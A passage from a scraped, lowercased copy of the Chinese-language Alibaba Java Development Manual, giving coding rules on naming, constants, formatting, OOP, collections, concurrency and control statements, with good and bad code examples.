is_deleted\n\n\n# 附 2：本手册专有名词\n\n 1.  POJO（Plain Ordinary Java Object）：在本手册中，POJO 专指只有 setter / getter / toString 的简单类，包括 DO/DTO/BO/VO 等。\n\n 2.  DO（Data Object）：本手册指数据库表一一对应的 POJO 类。\n\n 3.  GAV（GroupId、ArtifactctId、Version）：Maven 坐标，是用来唯一标识 jar 包。\n\n 4.  OOP（Object Oriented Programming）: 本手册泛指类、对象的编程处理方式。\n\n 5.  ORM（Object Relation Mapping）: 对象关系映射，对象领域模型与底层数据之间的转换， 本文泛指 iBATIS, mybatis 等框架。\n\n 6.  NPE（java.lang.NullPointerException）: 空指针异常。\n\n 7.  SOA（Service-Oriented Architecture）: 面向服务架构，它可以根据需求通过网络对松散 耦合的粗粒度应用组件进行分布式部署、组合和使用，有利于提升组件可重用性，可维护性。\n\n 8.  一方库：本工程内部子项目模块依赖的库（jar 包）。\n\n 9.  二方库：公司内部发布到中央仓库，可供公司内部其它应用依赖的库（jar 包）。\n\n 10. 三方库：公司之外的开源库（jar 包）。',normalizedContent:'> 最新阿里编码规范： https://edu.aliyun.com/course/417\n\n\n# 前言\n\n《阿里巴巴 java 开发手册》是阿里巴巴集团技术团队的集体经验总结，经历了多次大规模一线实战的检验及不断的完善，反馈给广大开发者。现代软件行业的高速发展对开发者的综合素质要求越来越高，因为不仅是编程知识点，其它维度的知识点也会影响到软件的最终交付质量。比如：数据库的表结构和索引设计缺陷可能带来软件上的架构缺陷或性能风险；工程结构混乱导致后续维护艰难；没有鉴权的漏洞代码易被黑客攻击等等。所以本手册以 java 开发者为中心视角，划分为编程规约、异常日志、mysql 数据库、工程结构、安全规约五大块，再根据内容特征，细分成若干二级子目录。根据约束力强弱及故障敏感性，规约依次分为强制、推荐、参考三大类。对于规约条目的延伸信息中，“说明”对内容做了引申和解释；“正例”提倡什么样的编码和实现方式；“反例”说明需要提防的雷区，以及真实的错误案例。\n\n本手册的愿景是码出高效、码出质量。代码的字里行间流淌的是软件生命中的血 液，质量的提升是尽可能少踩坑，杜绝踩重复的坑，切实提升质量意识。另外，现代 软件架构都需要协同开发完成，高效协作即降低协同成本，提升沟通效率，所谓无规 矩不成方圆，无规范不能协作。众所周知，制订交通法规表面上是要限制行车权，实 际上是保障公众的人身安全。试想如果没有限速，没有红绿灯，谁还敢上路行驶。对 软件来说，适当的规范和标准绝不是消灭代码内容的创造性、优雅性，而是限制过度 个性化，以一种普遍认可的统一方式一起做事，提升协作效率。\n\n《阿里巴巴 java 开发手册》，开放包容地认真听取社区、博客、论坛的反馈，及时修正，保持与时俱进。请关注手册末页的“阿里技术”和“云栖社区”公众号获取最新版本。\n\n\n# 编程规范\n\n\n# 命名风格\n\n 1.  【强制】代码中的命名均不能以下划线或美元符号开始，也不能以下划线或美元符号结束。\n     反例： _name / __name / $object / name_ / name$ / object$\n\n 2.  【强制】代码中的命名严禁使用拼音与英文混合的方式，更不允许直接使用中文的方式。说明：正确的英文拼写和语法可以让阅读者易于理解，避免歧义。注意，即使纯拼音命名方式也要避免采用。\n     正例： alibaba / taobao / youku / hangzhou 等国际通用的名称，可视同英文。\n     反例： dazhepromotion [打折] / getpingfenbyname() [评分] / int 某变量 = 3\n\n 3.  【强制】类名使用 uppercamelcase 风格，必须遵从驼峰形式，但以下情形例外：do / bo / dto / vo / ao\n     正例： marcopolo / userdo / xmlservice / tcpudpdeal / tapromotion\n     反例： macropolo / userdo / xmlservice / tcpudpdeal / tapromotion\n\n 4.  【强制】方法名、参数名、成员变量、局部变量都统一使用 lowercamelcase 风格，必须遵从驼峰形式。\n     正例： localvalue / gethttpmessage() / inputuserid\n\n 5.  【强制】常量命名全部大写，单词间用下划线隔开，力求语义表达完整清楚，不要嫌名字长。\n     正例： max_stock_count\n     反例： max_count\n\n 6.  【强制】抽象类命名使用 abstract 或 base 开头；异常类命名使用 exception 结尾；测试类命名以它要测试的类的名称开始，以 test 结尾。\n\n 7.  【强制】中括号是数组类型的一部分，数组定义如下：string[] args。\n     反例： 使用 string args[] 的方式来定义。\n\n 8.  【强制】pojo 类中布尔类型的变量，都不要加 is，否则部分框架解析会引起序列化错误。\n     反例： 定义为基本数据类型 boolean isdeleted；的属性，它的方法也是 isdeleted()，rpc 框架在反向解析的时候，“以为”对应的属性名称是 deleted，导致属性获取不到，进而抛出异常。\n\n 9.  【强制】包名统一使用小写，点分隔符之间有且仅有一个自然语义的英语单词。包名统一使用单数形式，但是类名如果有复数含义，类名可以使用复数形式。\n     正例： 应用工具类包名为 com.alibaba.open.util、类名为 messageutils（此规则参考 spring 的框架结构）\n\n 10. 【强制】杜绝完全不规范的缩写，避免望文不知义。\n     反例： abstractclass “缩写”命名成 absclass；condition “缩写”命名成 condi，此类随意缩写严重降低了代码的可阅读性。\n\n 11. 【推荐】如果使用到了设计模式，建议在类名中体现出具体模式。\n     说明： 将设计模式体现在名字中，有利于阅读者快速理解架构设计思想。\n     正例：\n\npublic class orderfactory;\npublic class loginproxy;\npublic class resourceobserver;\n\n\n1\n2\n3\n\n\n 12. 【推荐】接口类中的方法和属性不要加任何修饰符号（public 也不要加），保持代码的简洁性，并加上有效的 javadoc 注释。尽量不要在接口里定义变量，如果一定要定义变量，肯定是与接口方法相关，并且是整个应用的基础常量。\n     正例： 接口方法签名：void f();\n     接口基础常量表示：string company = "alibaba";\n     反例： 接口方法定义：public abstract void f();\n     说明： jdk8 中接口允许有默认实现，那么这个 default 方法，是对所有实现类都有价值的默认实现。\n\n 13. 接口和实现类的命名有两套规则：\n     1） 【强制】对于 service 和 dao 类，基于 soa 的理念，暴露出来的服务一定是接口，内部的实现类用 impl 的后缀与接口区别。\n     正例： cacheserviceimpl 实现 cacheservice 接口。\n     2） 【推荐】如果是形容能力的接口名称，取对应的形容词做接口名（通常是–able 的形式）。\n     正例： abstracttranslator 实现 translatable。\n\n 14. 【参考】枚举类名建议带上 enum 后缀，枚举成员名称需要全大写，单词间用下划线隔开。\n     说明： 枚举其实就是特殊的常量类，且构造方法被默认强制是私有。\n     正例： 枚举名字：dealstatusenum，成员名称：success / unkown_reason。\n\n 15. 【参考】各层命名规约：\n     \n     1. service/dao 层方法命名规约\n        1） 获取单个对象的方法用 get 做前缀。\n        2） 获取多个对象的方法用 list 做前缀。\n        3） 获取统计值的方法用 count 做前缀。\n        4） 插入的方法用 save（推荐）或 insert 做前缀。\n        5） 删除的方法用 remove（推荐）或 delete 做前缀。\n        6） 修改的方法用 update 做前缀。\n     2. 领域模型命名规约\n        1） 数据对象：xxxdo，xxx 即为数据表名。\n        2） 数据传输对象：xxxdto，xxx 为业务领域相关的名称。\n        3） 展示对象：xxxvo，xxx 一般为网页名称。\n        4） pojo 是 do/dto/bo/vo 的统称，禁止命名成 xxxpojo。\n\n\n# 常量定义\n\n 1. 【强制】不允许任何魔法值（即未经定义的常量）直接出现在代码中。\n    反例：\n\nstring key = "id#taobao_" + tradeid;  \ncache.put(key, value);\n\n\n1\n2\n\n 2. 【强制】long 或者 long 初始赋值时，必须使用大写的 l，不能是小写的 l，小写容易跟数字 1 混淆，造成误解。 说明：long a = 2l; 写的是数字的 21，还是 long 型的 2?\n 3. 【推荐】不要使用一个常量类维护所有常量，应该按常量功能进行归类，分开维护。如：缓存相关的常量放在类：cacheconsts 下；系统配置相关的常量放在类：configconsts 下。\n    说明： 大而全的常量类，非得使用查找功能才能定位到修改的常量，不利于理解和维护。\n 4. 【推荐】常量的复用层次有五层：跨应用共享常量、应用内共享常量、子工程内共享常量、包内共享常量、类内共享常量。 1） 跨应用共享常量：放置在二方库中，通常是 client.jar 中的 constant 目录下。\n    2） 应用内共享常量：放置在一方库的 modules 中的 constant 目录下。\n    反例： 易懂变量也要统一定义成应用内共享常量，两位攻城师在两个类中分别定义了表示“是”的变量：\n\n类 a 中：public static final string yes = "yes";  \n类 b 中：public static final string yes = "y";  \na.yes.equals(b.yes)，预期是 true，但实际返回为 false，导致线上问题。  \n\n\n1\n2\n3\n\n\n3） 子工程内部共享常量：即在当前子工程的 constant 目录下。\n4） 包内共享常量：即在当前包下单独的 constant 目录下。\n5） 类内共享常量：直接在类内部 private static final 定义。\n\n 5. 【推荐】如果变量值仅在一个范围内变化，且带有名称之外的延伸属性，定义为枚举类。下面正例中的数字就是延伸信息，表示星期几。\n    正例： public enum { monday(1), tuesday(2), wednesday(3), thursday(4), friday(5), saturday(6), sunday(7);}\n\n\n# 代码格式\n\n 1. 【强制】大括号的使用约定。如果是大括号内为空，则简洁地写成{}即可，不需要换行；如果是非空代码块则：\n    1） 左大括号前不换行。\n    2） 左大括号后换行。\n    3） 右大括号前换行。\n    4） 右大括号后还有 else 等代码则不换行；表示终止的右大括号后必须换行。\n\n 2. 【强制】 左小括号和字符之间不出现空格；同样，右小括号和字符之间也不出现空格。详见 第 5 条下方正例提示。\n    反例： if (空格 a == b 空格)\n\n 3. 【强制】if/for/while/switch/do 等保留字与括号之间都必须加空格。\n\n 4. 【强制】任何二目、三目运算符的左右两边都需要加一个空格。\n    说明： 运算符包括赋值运算符=、逻辑运算符&&、加减乘除符号等。\n\n 5. 【强制】缩进采用 4 个空格，禁止使用 tab 字符。\n    说明： 如果使用 tab 缩进，必须设置 1 个 tab 为 4 个空格。idea 设置 tab 为 4 个空格时，请勿勾选 use tab character；而在 eclipse 中，必须勾选 insert spaces for tabs。\n    正例： （涉及 1-5 点）\n\npublic static void main(string[] args) {\n  // 缩进 4 个空格\n  string say = "hello";\n  // 运算符的左右必须有一个空格\n  int flag = 0;\n  // 关键词 if 与括号之间必须有一个空格，括号内的 f 与左括号，0 与右括号不需要空格\n  if (flag == 0) {\n      system.out.println(say);\n  }\n\n  // 左大括号前加空格且不换行；左大括号后换行\n  if (flag == 1) {\n      system.out.println("world");\n      // 右大括号前换行，右大括号后有 else，不用换行\n  } else {\n      system.out.println("ok");\n      // 在右大括号后直接结束，则必须换行\n  }\n} \n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n\n 6. 【强制】单行字符数限制不超过 120 个，超出需要换行，换行时遵循如下原则：\n    1） 第二行相对第一行缩进 4 个空格，从第三行开始，不再继续缩进，参考示例。\n    2） 运算符与下文一起换行。\n    3） 方法调用的点符号与下文一起换行。\n    4） 在多个参数超长，在逗号后换行。\n    5） 在括号前不要换行，见反例。\n    正例：\n\n stringbuffer sb = new stringbuffer();\n //超过 120 个字符的情况下，换行缩进 4 个空格，并且方法前的点符号一起换行\n sb.append("zi").append("xin")...\n .append("huang")...\n .append("huang")...\n .append("huang");\n\n\n1\n2\n3\n4\n5\n6\n\n\n反例：\n\n stringbuffer sb = new stringbuffer();\n //超过 120 个字符的情况下，不要在括号前换行\n sb.append("zi").append("xin")...append\n ("huang");\n //参数很多的方法调用可能超过 120 个字符，不要在逗号前换行\n method(args1, args2, args3, ...\n , argsx); \n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n 7. 【强制】方法参数在定义和传入时，多个参数逗号后边必须加空格。\n    正例： 下例中实参的"a",后边必须要有一个空格。method("a", "b", "c");\n\n 8. 【强制】ide 的 text file encoding 设置为 utf-8; ide 中文件的换行符使用 unix 格式，不要使用 windows 格式。\n\n 9. 【推荐】没有必要增加若干空格来使某一行的字符与上一行对应位置的字符对齐。\n    正例：\n\n  int a = 3;\n  long b = 4l;\n  float c = 5f;\n  stringbuffer sb = new stringbuffer();\n\n\n1\n2\n3\n4\n\n\n说明： 增加 sb 这个变量，如果需要对齐，则给 a、b、c 都要增加几个空格，在变量比较多的情况下，是一种累赘的事情。\n\n 10. 【推荐】方法体内的执行语句组、变量的定义语句组、不同的业务逻辑之间或者不同的语义之间插入一个空行。相同业务逻辑和语义之间不需要插入空行。\n     说明： 没有必要插入多个空行进行隔开。\n\n\n# oop 规约\n\n 1.  【强制】避免通过一个类的对象引用访问此类的静态变量或静态方法，无谓增加编译器解析成本，直接用类名来访问即可。\n\n 2.  【强制】所有的覆写方法，必须加@override 注解。\n     说明： getobject() 与 get0bject() 的问题。一个是字母的 o，一个是数字的 0，加 @override可以准确判断是否覆盖成功。另外，如果在抽象类中对方法签名进行修改，其实现类会马上编译报错。\n\n 3.  【强制】相同参数类型，相同业务含义，才可以使用 java 的可变参数，避免使用 object。\n     说明： 可变参数必须放置在参数列表的最后。（提倡同学们尽量不用可变参数编程）\n     正例： public user getusers(string type, integer... ids) {...}\n\n 4.  【强制】外部正在调用或者二方库依赖的接口，不允许修改方法签名，避免对接口调用方产生影响。接口过时必须加 @deprecated 注解，并清晰地说明采用的新接口或者新服务是什么。\n\n 5.  【强制】不能使用过时的类或方法。\n     说明： java.net.urldecoder 中的方法 decode(string encodestr) 这个方法已经过时，应该使用双参数 decode(string source, string encode)。接口提供方既然明确是过时接口，那么有义务同时提供新的接口；作为调用方来说，有义务去考证过时方法的新实现是什么。\n\n 6.  【强制】object 的 equals 方法容易抛空指针异常，应使用常量或确定有值的对象来调用 equals。 正例： "test".equals(object); 反例： object.equals("test"); 说明： 推荐使用 java.util.objects#equals （jdk7 引入的工具类）\n\n 7.  【强制】所有的相同类型的包装类对象之间值的比较，全部使用 equals 方法比较。 说明：对于 integer var = ? 在-128 至 127 范围内的赋值，integer 对象是在 integercache.cache 产生，会复用已有对象，这个区间内的 integer 值可以直接使用 == 进行判断，但是这个区间之外的所有数据，都会在堆上产生，并不会复用已有对象，这是一个大坑，推荐使用 equals 方法进行判断。\n\n 8.  关于基本数据类型与包装数据类型的使用标准如下：\n     1） 【强制】所有的 pojo 类属性必须使用包装数据类型。\n     2） 【强制】rpc 方法的返回值和参数必须使用包装数据类型。\n     3） 【推荐】所有的局部变量使用基本数据类型。\n     说明： pojo 类属性没有初值是提醒使用者在需要使用时，必须自己显式地进行赋值，任何 npe 问题，或者入库检查，都由使用者来保证。\n     正例： 数据库的查询结果可能是 null，因为自动拆箱，用基本数据类型接收有 npe 风险。\n     反例： 比如显示成交总额涨跌情况，即正负 x%，x 为基本数据类型，调用的 rpc 服务，调用不成功时，返回的是默认值，页面显示：0%，这是不合理的，应该显示成中划线-。所以包装数据类型的 null 值，能够表示额外的信息，如：远程调用失败，异常退出。\n\n 9.  【强制】定义 do/dto/vo 等 pojo 类时，不要设定任何属性默认值。\n     反例： pojo 类的 gmtcreate 默认值为 new date();但是这个属性在数据提取时并没有置入具 体值，在更新其它字段时又附带更新了此字段，导致创建时间被修改成当前时间。\n\n 10. 【强制】序列化类新增属性时，请不要修改 serialversionuid 字段，避免反序列失败；如 果完全不兼容升级，避免反序列化混乱，那么请修改 serialversionuid 值。\n     说明： 注意 serialversionuid 不一致会抛出序列化运行时异常。\n\n 11. 【强制】构造方法里面禁止加入任何业务逻辑，如果有初始化逻辑，请放在 init 方法中。\n\n 12. 【强制】pojo 类必须写 tostring 方法。使用 ide 的中工具：source> generate tostring 时，如果继承了另一个 pojo 类，注意在前面加一下 super.tostring。\n     说明： 在方法执行抛出异常时，可以直接调用 pojo 的 tostring()方法打印其属性值，便于排查问题。\n\n 13. 【推荐】使用索引访问用 string 的 split 方法得到的数组时，需做最后一个分隔符后有无内容的检查，否则会有抛 indexoutofboundsexception 的风险。\n     说明：\n\nstring str = "a,b,c,,";\nstring[] ary = str.split(",");\n//预期大于 3，结果是 3\nsystem.out.println(ary.length);\n\n\n1\n2\n3\n4\n\n\n 14. 【推荐】当一个类有多个构造方法，或者多个同名方法，这些方法应该按顺序放置在一起，便于阅读。\n\n 15. 【推荐】 类内方法定义顺序依次是：公有方法或保护方法 > 私有方法 > getter/setter 方法。\n     说明： 公有方法是类的调用者和维护者最关心的方法，首屏展示最好；保护方法虽然只是子类关心，也可能是“模板设计模式”下的核心方法；而私有方法外部一般不需要特别关心，是一个黑盒实现；因为方法信息价值较低，所有 service 和 dao 的 getter/setter 方法放在类体最后。\n\n 16. 【推荐】setter 方法中，参数名称与类成员变量名称一致，this.成员名 = 参数名。在 getter/setter 方法中，不要增加业务逻辑，增加排查问题的难度。\n     反例：\n\npublic integer getdata() {\n    if (true) {\n   \t return this.data + 100;\n    } else {\n    \treturn this.data - 100;\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n\n 17. 【推荐】循环体内，字符串的连接方式，使用 stringbuilder 的 append 方法进行扩展。\n     说明： 反编译出的字节码文件显示每次循环都会 new 出一个 stringbuilder 对象，然后进行 append 操作，最后通过 tostring 方法返回 string 对象，造成内存资源浪费。\n     反例：\n\nstring str = "start";\nfor (int i = 0; i < 100; i++) {\n   str = str + "hello";\n}\n\n\n1\n2\n3\n4\n\n\n 18. 【推荐】final 可以声明类、成员变量、方法、以及本地变量，下列情况使用 final 关键字：\n     1） 不允许被继承的类，如：string 类。\n     2） 不允许修改引用的域对象，如：pojo 类的域变量。\n     3） 不允许被重写的方法，如：pojo 类的 setter 方法。\n     4） 不允许运行过程中重新赋值的局部变量。\n     5） 避免上下文重复使用一个变量，使用 final 描述可以强制重新定义一个变量，方便更好地进行重构。\n\n 19. 【推荐】慎用 object 的 clone 方法来拷贝对象。\n     说明： 对象的 clone 方法默认是浅拷贝，若想实现深拷贝需要重写 clone 方法实现属性对象的拷贝。\n\n 20. 【推荐】类成员与方法访问控制从严：\n     1） 如果不允许外部直接通过 new 来创建对象，那么构造方法必须是 private。\n     2） 工具类不允许有 public 或 default 构造方法。\n     3） 类非 static 成员变量并且与子类共享，必须是 protected。\n     4） 类非 static 成员变量并且仅在本类使用，必须是 private。\n     5） 类 static 成员变量如果仅在本类使用，必须是 private。\n     6） 若是 static 成员变量，必须考虑是否为 final。\n     7） 类成员方法只供类内部调用，必须是 private。\n     8） 类成员方法只对继承类公开，那么限制为 protected。\n     说明： 任何类、方法、参数、变量，严控访问范围。过于宽泛的访问范围，不利于模块解耦。 思考：如果是一个 private 的方法，想删除就删除，可是一个 public 的 service 方法，或者一个 public 的成员变量，删除一下，不得手心冒点汗吗？变量像自己的小孩，尽量在自己的视线内，变量作用域太大，如果无限制的到处跑，那么你会担心的。\n\n\n# 集合处理\n\n 1. 【强制】关于 hashcode 和 equals 的处理，遵循如下规则：\n    1） 只要重写 equals，就必须重写 hashcode。\n    2） 因为 set 存储的是不重复的对象，依据 hashcode 和 equals 进行判断，所以 set 存储的对象必须重写这两个方法。\n    3） 如果自定义对象做为 map 的键，那么必须重写 hashcode 和 equals。\n    说明： string 重写了 hashcode 和 equals 方法，所以我们可以非常愉快地使用 string 对象作为 key 来使用。\n\n 2. 【强制】arraylist 的 sublist 结果不可强转成 arraylist，否则会抛出 classcastexception 异常：java.util.randomaccesssublist cannot be cast to java.util.arraylist ;\n    说明： sublist 返回的是 arraylist 的内部类 sublist，并不是 arraylist ，而是 arraylist 的一个视图，对于 sublist 子列表的所有操作最终会反映到原列表上。\n\n 3. 【强制】 在 sublist 场景中，高度注意对原集合元素个数的修改，会导致子列表的遍历、增 加、删除均产生 concurrentmodificationexception 异常。\n\n 4. 【强制】使用集合转数组的方法，必须使用集合的 toarray(t[] array)，传入的是类型完全一样的数组，大小就是 list.size()。\n    说明： 使用 toarray 带参方法，入参分配的数组空间不够大时，toarray 方法内部将重新分配内存空间，并返回新数组地址；如果数组元素大于实际所需，下标为[ list.size() ]的数组元素将被置为 null，其它数组元素保持原值，因此最好将方法入参数组大小定义与集合元素个数一致。\n    正例：\n\n list<string> list = new arraylist<string>(2);\n list.add("guan");\n list.add("bao");\n string[] array = new string[list.size()];\n array = list.toarray(array);\n\n\n1\n2\n3\n4\n5\n\n\n反例： 直接使用 toarray 无参方法存在问题，此方法返回值只能是 object[]类，若强转其它类型数组将出现 classcastexception 错误。\n\n 5. 【强制】使用工具类 arrays.aslist()把数组转换成集合时，不能使用其修改集合相关的方 法，它的 add/remove/clear 方法会抛出 unsupportedoperationexception 异常。\n    说明： aslist 的返回对象是一个 arrays 内部类，并没有实现集合的修改方法。arrays.aslist 体现的是适配器模式，只是转换接口，后台的数据仍是数组。\n\n  string[] str = new string[] { "a", "b" };\n  list list = arrays.aslist(str);\n\n\n1\n2\n\n\n第一种情况：list.add("c"); 运行时异常。\n第二种情况：str[0] = "gujin"; 那么 list.get(0)也会随之修改。\n\n 6. 【强制】泛型通配符 <? extends t> 来接收返回的数据，此写法的泛型集合不能使用 add 方法，而 <? super t> 不能使用 get 方法，做为接口调用赋值时易出错。\n    说明： 扩展说一下 pecs(producer extends consumer super) 原则：1）频繁往外读取内容 的，适合用上界 extends。2）经常往里插入的，适合用下界 super。\n\n 7. 【强制】不要在 foreach 循环里进行元素的 remove/add 操作。remove 元素请使用 iterator 方式，如果并发操作，需要对 iterator 对象加锁。\n    正例：\n\niterator<string> it = a.iterator();\nwhile (it.hasnext()) {\n   string temp = it.next();\n   if (删除元素的条件) {\n       it.remove();\n   }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n反例：\n\nlist<string> a = new arraylist<string>();\na.add("1");\na.add("2");\nfor (string temp : a) {\n   if ("1".equals(temp)) {\n       a.remove(temp);\n   }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\n说明： 以上代码的执行结果肯定会出乎大家的意料，那么试一下把“1”换成“2”，会是同样的结果吗？\n\n 8. 【强制】 在 jdk7 版本及以上，comparator 要满足如下三个条件，不然 arrays.sort，collections.sort 会报 illegalargumentexception 异常。\n    说明：\n    1） x，y 的比较结果和 y，x 的比较结果相反。\n    2） x>y，y>z，则 x>z。\n    3） x=y，则 x，z 比较结果和 y，z 比较结果相同。\n    反例： 下例中没有处理相等的情况，实际使用中可能会出现异常：\n\n new comparator<student>() {\n     @override\n     public int compare(student o1, student o2) {\n         return o1.getid() > o2.getid() ? 1 : -1;\n     }\n };\n\n\n1\n2\n3\n4\n5\n6\n\n\n 9.  【推荐】集合初始化时，指定集合初始值大小。\n     说明： hashmap 使用 hashmap(int initialcapacity) 初始化， 正例： initialcapacity = (需要存储的元素个数 / 负载因子) + 1。注意负载因子（即 loaderfactor）默认为 0.75，如果暂时无法确定初始值大小，请设置为 16。\n     反例： hashmap 需要放置 1024 个元素，由于没有设置容量初始大小，随着元素不断增加，容量 7 次被迫扩大，resize 需要重建 hash 表，严重影响性能。\n\n 10. 【推荐】使用 entryset 遍历 map 类集合 kv，而不是 keyset 方式进行遍历。\n     说明： keyset 其实是遍历了 2 次，一次是转为 iterator 对象，另一次是从 hashmap 中取出 key 所对应的 value。而 entryset 只是遍历了一次就把 key 和 value 都放到了 entry 中，效率更高。如果是 jdk8，使用 map.foreach 方法。\n     正例： values() 返回的是 v 值集合，是一个 list 集合对象；keyset() 返回的是 k 值集合，是一个 set 集合对象；entryset() 返回的是 k-v 值组合集合。\n\n 11. 【推荐】高度注意 map 类集合 k/v 能不能存储 null 值的情况，如下表格：\n\n集合类                 key         value       super         说明\nhashtable           不允许为 null   不允许为 null   dictionary    线程安全\nconcurrenthashmap   不允许为 null   不允许为 null   abstractmap   分段锁技术\ntreemap             不允许为 null   允许为 null    abstractmap   线程不安全\nhashmap             允许为 null    允许为 null    abstractmap   线程不安全\n\n反例： 由于 hashmap 的干扰，很多人认为 concurrenthashmap 是可以置入 null 值，而事实上，存储 null 值时会抛出 npe 异常。\n\n 12. 【参考】合理利用好集合的有序性(sort)和稳定性(order)，避免集合的无序性(unsort)和不稳定性(unorder)带来的负面影响。\n     说明： 有序性是指遍历的结果是按某种比较规则依次排列的。稳定性指集合每次遍历的元素次 序是一定的。如： arraylist 是 order/unsort；hashmap 是 unorder/unsort；treeset 是 order/sort。\n\n 13. 【参考】利用 set 元素唯一的特性，可以快速对一个集合进行去重操作，避免使用 list 的 contains 方法进行遍历、对比、去重操作。\n\n\n# 并发处理\n\n 1. 【强制】获取单例对象需要保证线程安全，其中的方法也要保证线程安全。\n    说明： 资源驱动类、工具类、单例工厂类都需要注意。\n\n 2. 【强制】创建线程或线程池时请指定有意义的线程名称，方便出错时回溯。\n    正例：\n\n public class timertaskthread extends thread {\n     public timertaskthread() {\n         super.setname("timertaskthread"); ...\n     }\n }\n\n\n1\n2\n3\n4\n5\n\n\n 3. 【强制】线程资源必须通过线程池提供，不允许在应用中自行显式创建线程。\n    说明： 使用线程池的好处是减少在创建和销毁线程上所花的时间以及系统资源的开销，解决资 源不足的问题。如果不使用线程池，有可能造成系统创建大量同类线程而导致消耗完内存或者“过度切换”的问题。\n\n 4. 【强制】线程池不允许使用 executors 去创建，而是通过 threadpoolexecutor 的方式，这样的处理方式让写的同学更加明确线程池的运行规则，规避资源耗尽的风险。\n    说明： executors 返回的线程池对象的弊端如下：\n    \n    1. fixedthreadpool 和 singlethreadpool:\n       允许的请求队列长度为 integer.max_value，可能会堆积大量的请求，从而导致 oom。\n    2. cachedthreadpool 和 scheduledthreadpool:\n       允许的创建线程数量为 integer.max_value，可能会创建大量的线程，从而导致 oom。\n\n 5. 【强制】simpledateformat 是线程不安全的类，一般不要定义为 static 变量，如果定义为 static，必须加锁，或者使用 dateutils 工具类。\n    正例： 注意线程安全，使用 dateutils。亦推荐如下处理：\n\n  private static final threadlocal<dateformat> df = new threadlocal<dateformat>() {\n      @override\n      protected dateformat initialvalue() {\n          return new simpledateformat("yyyy-mm-dd");\n      }\n  };\n\n\n1\n2\n3\n4\n5\n6\n\n\n说明： 如果是 jdk8 的应用，可以使用 instant 代替 date，localdatetime 代替 calendar，datetimeformatter 代替 simpledateformatter，官方给出的解释：simple beautiful strong immutable thread-safe。\n\n 6.  【强制】高并发时，同步调用应该去考量锁的性能损耗。能用无锁数据结构，就不要用锁；能锁区块，就不要锁整个方法体；能用对象锁，就不要用类锁。\n     说明： 尽可能使加锁的代码块工作量尽可能的小，避免在锁代码块中调用 rpc 方法。\n\n 7.  【强制】对多个资源、数据库表、对象同时加锁时，需要保持一致的加锁顺序，否则可能会造成死锁。\n     说明： 线程一需要对表 a、b、c 依次全部加锁后才可以进行更新操作，那么线程二的加锁顺序也必须是 a、b、c，否则可能出现死锁。\n\n 8.  【强制】并发修改同一记录时，避免更新丢失，需要加锁。要么在应用层加锁，要么在缓存加锁，要么在数据库层使用乐观锁，使用 version 作为更新依据。\n     说明： 如果每次访问冲突概率小于 20%，推荐使用乐观锁，否则使用悲观锁。乐观锁的重试次数不得小于 3 次。\n\n 9.  【强制】多线程并行处理定时任务时，timer 运行多个 timetask 时，只要其中之一没有捕获抛出的异常，其它任务便会自动终止运行，使用 scheduledexecutorservice 则没有这个问题。\n\n 10. 【推荐】使用 countdownlatch 进行异步转同步操作，每个线程退出前必须调用 countdown 方法，线程执行代码注意 catch 异常，确保 countdown 方法可以执行，避免主线程无法执行至 await 方法，直到超时才返回结果。\n     说明： 注意，子线程抛出异常堆栈，不能在主线程 try-catch 到。\n\n 11. 【推荐】避免 random 实例被多线程使用，虽然共享该实例是线程安全的，但会因竞争同一 seed 导致的性能下降。\n     说明： random 实例包括 java.util.random 的实例或者 math.random() 的方式。\n     正例： 在 jdk7 之后，可以直接使用 api threadlocalrandom，而在 jdk7 之前，需要编码保证每个线程持有一个实例。\n\n 12. 【推荐】在并发场景下，通过双重检查锁（double-checked locking）实现延迟初始化的优化问题隐患(可参考 the "double-checked locking is broken" declaration)，推荐问题解决方案中较为简单一种（适用于 jdk5 及以上版本），将目标属性声明为 volatile 型。\n     反例：\n\nclass foo {\n    private helper helper = null;\n    public helper gethelper() {\n        if (helper == null) synchronized(this) {\n            if (helper == null)\n                helper = new helper();\n        }\n        return helper;\n    }\n    // other functions and members...\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n\n 13. 【参考】volatile 解决多线程内存不可见问题。对于一写多读，是可以解决变量同步问题，但是如果多写，同样无法解决线程安全问题。如果是 count++操作，使用如下类实现： atomicinteger count = new atomicinteger(); count.addandget(1); 如果是 jdk8，推荐使用 longadder 对象，比 atomiclong 性能更好（减少乐观锁的重试次数）。\n\n 14. 【参考】 在容量不够进行 resize 时由于高并发可能出现死链，导致 cpu 飙升，在开发过程中可以使用其它数据结构或加锁来规避此风险。\n\n 15. 【参考】threadlocal 无法解决共享对象的更新问题，threadlocal 对象建议使用 static 修饰。这个变量是针对一个线程内所有操作共有的，所以设置为静态变量，所有此类实例共享此静态变量，也就是说在类第一次被使用时装载，只分配一块存储空间，所有此类的对象(只要是这个线程内定义的)都可以操控这个变量。\n\n\n# 控制语句\n\n 1. 【强制】在一个 switch 块内，每个 case 要么通过 break/return 等来终止，要么注释说明程序将继续执行到哪一个 case 为止；在一个 switch 块内，都必须包含一个 default 语句并且放在最后，即使它什么代码也没有。\n\n 2. 【强制】在 if/else/for/while/do 语句中必须使用大括号。即使只有一行代码，避免使用单行的形式：if (condition) statements;\n\n 3. 【推荐】表达异常的分支时，少用 if-else 方式，这种方式可以改写成：\n\n    if (condition) {\n     ...\n     return obj;\n    }\n    // 接着写 else 的业务逻辑代码;\n\n\n1\n2\n3\n4\n5\n\n\n说明： 如果非得使用 if()...else if()...else...方式表达逻辑，【强制】避免后续代码维护困难，请勿超过 3 层。\n\n正例： 逻辑上超过 3 层的 if-else 代码可以使用卫语句，或者状态模式来实现。卫语句示例如下：\n\n    public void today() {\n        if (isbusy()) {\n            system.out.println(“change time.”);\n            return;\n        }\n        if (isfree()) {\n            system.out.println(“go to travel.”);\n            return;\n        }\n        system.out.println(“stay at home to learn alibaba java coding guideline.”);\n        return;\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n 4. 【推荐】除常用方法（如 getxxx/isxxx）等外，不要在条件判断中执行其它复杂的语句，将复杂逻辑判断的结果赋值给一个有意义的布尔变量名，以提高可读性。\n    说明： 很多 if 语句内的逻辑相当复杂，阅读者需要分析条件表达式的最终结果，才能明确什么样的条件执行什么样的语句，那么，如果阅读者分析逻辑表达式错误呢？\n    正例：\n\n 